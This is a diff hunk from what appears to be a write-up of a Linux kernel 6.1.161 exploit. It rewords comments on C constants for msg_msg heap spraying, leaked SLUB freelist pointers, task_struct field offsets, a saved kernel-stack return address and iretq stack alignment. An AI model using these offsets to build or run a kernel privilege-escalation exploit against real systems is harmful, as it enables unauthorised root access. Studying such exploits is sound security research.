@@ -207,17 +207,17 @@ The following offsets are specific to the target kernel (6.1.161) and must be ad
 ```c
 #define SPRAY_MSG_SIZE      0x2000
 #define KMALLOC_1024_SIZE   0x400
-#define MSG_NEXT_BUF_OFFSET 0xfc8     // offset to next msg_msg payload in leaked data
+#define MSG_NEXT_BUF_OFFSET 0xfc8     // payload offset in corrupted msg_msg chain
 #define MSG_FD2_OFFSET      0x30      // freelist pointer #1 in leaked SLUB metadata
 #define MSG_FD3_OFFSET      0x70      // freelist pointer #2 in leaked SLUB metadata
-#define MSG_KMALLOC_PTR     0x10      // offset to kmalloc-1024 pointer in leaked chain
-#define TASK_NEXT_OFFSET    0x4a0     // offsetof(struct task_struct, tasks.next)
-#define TASK_COMM_OFFSET    0x778     // offsetof(struct task_struct, comm)
-#define TASK_STACK_OFFSET   0x20      // offsetof(struct task_struct, stack)
-#define TASK_FS_OFFSET      0x7a8     // offsetof(struct task_struct, fs)
-#define TASK_SAFE_OFFSET    0x38      // safe dereference offset within task_struct
-#define RET_OFFSET          0x3f08    // saved return address offset on kernel stack
-#define RSP_DELTA           0x20      // stack alignment correction for iretq
+#define MSG_KMALLOC_PTR     0x10      // pointer to kmalloc-1024 region in leaked chain
+#define TASK_NEXT_OFFSET    0x4a0     // task_struct->tasks list_head
+#define TASK_COMM_OFFSET    0x778     // task_struct->comm
+#define TASK_STACK_OFFSET   0x20      // task_struct->stack
+#define TASK_FS_OFFSET      0x7a8     // task_struct->fs
+#define TASK_SAFE_OFFSET    0x38      // read offset within task_struct avoiding NULL fields
+#define RET_OFFSET          0x3f08    // saved return address on kernel stack
+#define RSP_DELTA           0x20      // stack alignment for iretq frame
 ```
 
 ---
